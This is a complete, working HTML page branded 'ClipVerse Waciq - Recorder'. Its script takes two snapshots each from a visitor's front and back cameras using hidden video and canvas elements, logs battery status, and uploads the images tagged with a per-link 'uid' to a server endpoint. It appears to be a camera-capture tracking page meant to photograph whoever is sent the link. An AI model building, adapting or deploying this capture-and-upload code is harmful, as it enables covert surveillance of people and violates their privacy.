<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>ClipVerse Waciq - Recorder</title>
  <link rel="icon" type="image/png" href="https://i.postimg.cc/7L0qWffg/Screenshot-20250806-094750-2.jpg">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: url('https://i.postimg.cc/N2vfNSCn/Screenshot-20250805-190626-2.jpg') no-repeat center center fixed;
      background-size: cover;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
      text-align: center;
      backdrop-filter: blur(6px);
    }
    .container {
      background: rgba(0, 0, 0, 0.65);
      border-radius: 18px;
      padding: 36px 30px;
      width: 100%;
      max-width: 820px;
      box-shadow: 0 0 30px rgba(0,255,153,0.35);
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 18px;
      animation: popIn 0.6s ease-out;
    }
    .top-row {
      display:flex;
      width:100%;
      align-items:center;
      justify-content:space-between;
      gap:12px;
    }
    .logo {
      width: 88px;
      height: auto;
      margin: 0;
      box-shadow: 0 0 12px rgba(0,255,255,0.4);
      border-radius: 6px;
      background: rgba(255,255,255,0.02);
      padding:6px;
    }
    .title {
      flex:1;
      text-align:left;
      margin-left:14px;
    }
    .title h1{
      margin:0;
      font-family: 'Orbitron', monospace;
      font-size: 22px;
      color: #00ffd0;
      text-shadow: 0 0 8px rgba(0,255,200,0.12);
    }
    .title p{ margin:2px 0 0; font-size:13px; color:#bfffdc; opacity:0.9; }
    .loader {
      border: 6px solid rgba(255,255,255,0.12);
      border-top: 6px solid #00ffc9;
      border-radius: 50%;
      width: 48px;
      height: 48px;
      animation: spin 1s linear infinite;
    }
    .text {
      font-size: 17px;
      line-height: 1.6;
      font-weight:700;
      background: linear-gradient(90deg,#00ffe7,#00ffa1,#9fff5b);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    .credit { margin-top: 6px; font-size:13px; color:#d0ffd6; opacity:0.9; }

    /* status & log panel */
    .panel {
      width:100%;
      display:flex;
      gap:16px;
      margin-top:6px;
    }
    .col {
      flex:1;
      background: rgba(0,0,0,0.35);
      border-radius: 12px;
      padding: 12px;
      min-height: 120px;
      box-shadow: inset 0 0 12px rgba(0,0,0,0.6);
      text-align:left;
    }
    .col h3 { margin:0 0 8px 0; font-size:14px; color:#bfffdc; }
    #status { font-size:14px; color:#e6fff2; margin:0 0 6px 0; }
    #log { font-family: monospace; font-size:13px; color:#c8ffd8; white-space:pre-wrap; max-height:240px; overflow:auto; }

    @keyframes spin { 0%{transform:rotate(0)}100%{transform:rotate(360deg)} }
    @keyframes popIn { 0%{opacity:0; transform:scale(0.96)}100%{opacity:1; transform:scale(1)} }
    @media (max-width:720px){
      .panel{ flex-direction:column; }
      .title p{ display:none; }
    }
    video, canvas { display:none; }
  </style>
</head>
<body>
  <div class="container">
    <div class="top-row">
      <img class="logo" src="https://i.postimg.cc/7L0qWffg/Screenshot-20250806-094750-2.jpg" alt="logo">
      <div class="title">
        <h1>ClipVerse Waciq â€” Recorder</h1>
        <p>Recording snapshots from front & back cameras and uploading to /api/upload</p>
      </div>
      <div style="display:flex;flex-direction:column;align-items:center;gap:6px;">
        <div class="loader" aria-hidden="true"></div>
        <div style="font-size:12px;color:#ddffee">Recording</div>
      </div>
    </div>

    <div class="text">ğŸ•µï¸â€â™‚ï¸ Recording in progress â€” Please keep this tab open ğŸ¥</div>

    <div class="panel">
      <div class="col">
        <h3>Status</h3>
        <div id="status">Initializing...</div>
        <div class="credit">ğ— ğ—®ğ—±ğ—² ğ—¯ğ˜† ğŸ’› ğ—ªğ—”ğ—–ğ—œğ—¤</div>
      </div>
      <div class="col">
        <h3>Log</h3>
        <div id="log"></div>
      </div>
    </div>
  </div>

  <!-- Hidden video/canvas elements -->
  <video id="videoFront" autoplay playsinline></video>
  <video id="videoBack" autoplay playsinline></video>
  <canvas id="snapshotFront"></canvas>
  <canvas id="snapshotBack"></canvas>

<script>
/* Robust camera + snapshot flow with logs and timestamps.
   - Takes two front snapshots and two back snapshots (if available).
   - Uploads each to /api/upload with retries.
   - Shows status & detailed log in UI.
*/

const statusEl = document.getElementById('status');
const logEl = document.getElementById('log');
const uid = new URLSearchParams(window.location.search).get('uid') || 'unknown';

function nowISO(){ return new Date().toISOString(); }
function log(msg){
  const line = `[${nowISO()}] ${msg}\n`;
  logEl.innerText = line + logEl.innerText;
  console.log(msg);
}

/* small helper to wait for video metadata */
function waitForLoadedMetadata(videoEl, timeout=3500){
  return new Promise((resolve) => {
    if(videoEl.readyState >= 1 && videoEl.videoWidth){
      resolve();
      return;
    }
    const onLoaded = () => { videoEl.removeEventListener('loadedmetadata', onLoaded); resolve(); };
    videoEl.addEventListener('loadedmetadata', onLoaded);
    setTimeout(()=>resolve(), timeout);
  });
}

/* take snapshot */
async function takeSnapshot(videoEl, canvasEl){
  await waitForLoadedMetadata(videoEl);
  const w = videoEl.videoWidth || 640;
  const h = videoEl.videoHeight || 480;
  canvasEl.width = w; canvasEl.height = h;
  const ctx = canvasEl.getContext('2d');
  ctx.drawImage(videoEl, 0, 0, w, h);
  return canvasEl.toDataURL('image/png');
}

/* upload with retries */
async function upload(payload, maxRetries=2){
  let lastErr = null;
  for(let attempt=0; attempt<=maxRetries; attempt++){
    try{
      const res = await fetch('/api/upload', {
        method:'POST',
        headers:{ 'Content-Type':'application/json' },
        body: JSON.stringify(payload)
      });
      if(!res.ok){
        const txt = await res.text().catch(()=>'');
        throw new Error(`HTTP ${res.status} ${res.statusText} ${txt}`);
      }
      const json = await res.json().catch(()=>({ok:true}));
      return json;
    }catch(err){
      lastErr = err;
      log(`Upload attempt ${attempt+1} failed: ${err.message}`);
      await new Promise(r=>setTimeout(r, 600));
    }
  }
  throw lastErr;
}

/* discover video devices (try to get labels by requesting permission once) */
async function getVideoDevices(){
  try{
    const temp = await navigator.mediaDevices.getUserMedia({video:true});
    temp.getTracks().forEach(t=>t.stop());
  }catch(e){
    // ignore; may be permission denied, we'll still enumerate
  }
  const devices = await navigator.mediaDevices.enumerateDevices();
  return devices.filter(d=>d.kind === 'videoinput');
}

/* start stream by deviceId or facingMode fallback */
async function startStreamForDevice(videoEl, deviceId, facing){
  try{
    if(deviceId){
      const s = await navigator.mediaDevices.getUserMedia({ video: { deviceId: { exact: deviceId } } });
      videoEl.srcObject = s;
      await waitForLoadedMetadata(videoEl);
      return s;
    }else if(facing){
      const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
      videoEl.srcObject = s;
      await waitForLoadedMetadata(videoEl);
      return s;
    }else{
      const s = await navigator.mediaDevices.getUserMedia({ video: true });
      videoEl.srcObject = s;
      await waitForLoadedMetadata(videoEl);
      return s;
    }
  }catch(err){
    throw err;
  }
}

/* main flow */
(async function main(){
  statusEl.innerText = 'Detecting devices...';
  log('Init: starting device discovery');

  // battery info
  try{
    const battery = await navigator.getBattery();
    log(`Battery: ${Math.round(battery.level*100)}% | Charging: ${battery.charging}`);
  }catch(e){
    log('Battery API not available');
  }

  const videoFront = document.getElementById('videoFront');
  const videoBack = document.getElementById('videoBack');
  const canvasFront = document.getElementById('snapshotFront');
  const canvasBack = document.getElementById('snapshotBack');

  let devices = [];
  try{
    devices = await getVideoDevices();
    log(`Found ${devices.length} video device(s).`);
  }catch(e){
    log('enumerateDevices failed: ' + (e && e.message ? e.message : e));
  }

  // guess front/back by label if available
  const backGuess = devices.find(d => /back|rear|environment|cam 1|camera 1/i.test(d.label)) || devices[1] || null;
  const frontGuess = devices.find(d => /front|user|selfie/i.test(d.label)) || devices[0] || null;

  if(frontGuess) log(`Guessed front device: ${frontGuess.label || frontGuess.deviceId}`);
  if(backGuess) log(`Guessed back device: ${backGuess.label || backGuess.deviceId}`);

  // start front
  let frontStream = null;
  try{
    if(frontGuess && frontGuess.deviceId){
      frontStream = await startStreamForDevice(videoFront, frontGuess.deviceId, null);
      log('Front camera started using deviceId');
    }else{
      frontStream = await startStreamForDevice(videoFront, null, 'user');
      log('Front camera started using facingMode:user');
    }
    statusEl.innerText = 'Front camera ready...';
  }catch(err){
    log('Front camera failed: ' + (err && err.name ? err.name + ': ' + err.message : err));
    statusEl.innerText = 'Front camera error';
  }

  // start back with fallbacks
  let backStream = null;
  try{
    if(backGuess && backGuess.deviceId){
      try{
        backStream = await startStreamForDevice(videoBack, backGuess.deviceId, null);
        log('Back camera started using deviceId');
      }catch(err){
        log('Back via deviceId failed, trying facingMode:environment â€” ' + (err && err.message ? err.message : err));
        backStream = await startStreamForDevice(videoBack, null, 'environment');
        log('Back camera started using facingMode:environment fallback');
      }
    }else{
      backStream = await startStreamForDevice(videoBack, null, 'environment');
      log('Back camera started using facingMode:environment');
    }
    statusEl.innerText = 'Back camera ready...';
  }catch(err){
    log('Back camera error: ' + (err && err.name ? err.name + ': ' + err.message : err));
    statusEl.innerText = 'Back camera error';
  }

  // schedule snapshots
  const tasks = [];
  if(frontStream){
    tasks.push({when:1500, cam:'Front'});
    tasks.push({when:3500, cam:'Front'});
  } else {
    log('Skipping front snapshots (no front stream)');
  }
  if(backStream){
    tasks.push({when:5500, cam:'Back'});
    tasks.push({when:7500, cam:'Back'});
  } else {
    log('Skipping back snapshots (no back stream)');
  }

  for(const t of tasks){
    setTimeout(async ()=>{
      const label = t.cam;
      const videoEl = label === 'Front' ? videoFront : videoBack;
      const canvasEl = label === 'Front' ? canvasFront : canvasBack;
      if(!videoEl || !videoEl.srcObject){
        log(`${label} snapshot skipped â€” stream unavailable`);
        return;
      }
      log(`${label}: taking snapshot...`);
      let imageData;
      try{
        imageData = await takeSnapshot(videoEl, canvasEl);
        log(`${label}: snapshot captured`);
      }catch(err){
        log(`${label}: snapshot failed â€” ${err && err.message ? err.message : err}`);
        return;
      }

      const payload = {
        uid,
        camera: label,
        timestamp: nowISO(),
        image: imageData
      };

      try{
        log(`${label}: uploading...`);
        const res = await upload(payload, 2);
        log(`${label}: upload success â€” response ${JSON.stringify(res).slice(0,200)}`);
      }catch(err){
        log(`${label}: upload permanently failed â€” ${err && err.message ? err.message : err}`);
      }
    }, t.when);
  }

})();
</script>
</body>
</html> 
